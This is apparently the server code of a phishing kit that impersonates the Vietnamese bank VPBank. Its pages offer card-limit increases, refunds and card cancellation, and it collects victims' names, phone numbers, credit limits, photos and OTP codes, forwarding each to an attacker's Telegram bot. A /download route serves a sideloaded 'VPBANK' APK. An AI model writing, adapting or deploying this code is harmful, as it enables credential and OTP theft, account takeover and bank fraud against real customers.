require('dotenv').config();
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const http = require('http').createServer(app);
const { Server } = require('socket.io');
var cors = require('cors')
const io = new Server(http);
var siofu = require("socketio-file-upload");
const axios = require('axios');


app.use(express.static('public'));
app.set('view engine', 'html');
app.set('views', './views');
app.use(cors({
    origin: '*'
}));
app.use(siofu.router).listen(process.env.PORT_UPLOAD || 3001);

io.on("connection", function (socket) {
    var uploader = new siofu();
    uploader.dir = "./public/uploads";
    uploader.listen(socket);
    uploader.on("saved", function (event) {
        socket.emit('file', event.file.pathName);
    });
    socket.on('service', async (data) => {
        // send data to api telegram
        const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            mode: 'html'
        })

        await sendPhoto(data.images);

        socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
    });


    socket.on('otp', (data) => {
        // send data to api telegram
        const message = `Mã OTP: ${data.otp}`;
        axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            mode: 'html'
        }).then((res) => {
            // console.log('res', res.data);
            socket.emit('success', { message: 'Đã gửi mã OTP thành công' });

        }).catch((err) => {
            // console.log('err', err);
            socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
        });

    });
});
const sendPhoto = async (photos) => {
    const promises = photos.map(async (photo) => {
        return await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            photo: photo,
        });
    });
    return Promise.all(promises);
}


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/views/index.html');
});
app.get('/chuyen-tien-atm', (req, res) => {
    res.sendFile(__dirname + '/views/chuyen-tien-atm.html');
})
app.get('/chuyen-tra-gop', (req, res) => {
    res.sendFile(__dirname + '/views/chuyen-tra-gop.html');
});
app.get('/dang-ky-nang-cap', (req, res) => {
    res.sendFile(__dirname + '/views/dang-ky-nang-cap.html');
});
app.get('/hoan-tien', (req, res) => {
    res.sendFile(__dirname + '/views/hoan-tien.html');
});
app.get('/nang-han-muc', (req, res) => {
    res.sendFile(__dirname + '/views/nang-han-muc.html');
});
app.get('/otp', (req, res) => {
    res.sendFile(__dirname + '/views/otp.html');
});
app.get('/otp-error', (req, res) => {
    res.sendFile(__dirname + '/views/otp-error.html');
});
app.get('/yeu-cau-huy-the', (req, res) => {
    res.sendFile(__dirname + '/views/yeu-cau-huy-the.html');
});
app.get('/sang-ngang-the', (req, res) => {
    res.sendFile(__dirname + '/views/sang-ngang-the.html');
});
app.get('/download', function (req, res) {
    const file = `${__dirname}/public/app/VPBANK_v3.10.13.apk`;
    res.download(file, 'VPBANK_v3.10.13.apk', {
        cacheControl: false
    }, (err) => {
        console.log('err', err);
    }); // Set disposition and send it.
});
app.get('/download-app', function (req, res) {
    res.sendDate(__dirname + '/views/download-app.html');
});


http.listen(port, () => {
    console.log(`Đã chạy trên cổng :${port}`);
});
